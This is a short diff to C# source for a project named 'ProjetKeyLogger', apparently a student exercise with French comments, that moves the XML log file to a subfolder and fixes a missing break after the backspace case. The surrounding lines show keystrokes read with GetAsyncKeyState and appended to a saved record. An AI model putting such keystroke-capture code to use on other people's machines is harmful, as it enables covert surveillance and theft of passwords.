@@ -34,7 +34,7 @@ namespace ProjetKeyLogger
             collection_enregistrement = new CollectionEnregistrement();
 
             //Chemin pour enregistrer le fichier XML
-            file_path = "../../../TestXML.xml";
+            file_path = "../../../Fichier XML/TestXML.xml";
         }
 
         //GetAsyncKeyState function : permet de savoir si une touche ets activé ou non
@@ -90,7 +90,8 @@ namespace ProjetKeyLogger
                                 break;
 
                             case 8:
-                                enregistrement.effacerContenu();
+                               enregistrement.effacerContenu();
+                                break;
 
                             default:
                                 //Concatenation e la derniere touche tapée au contenu de l'enregistrement
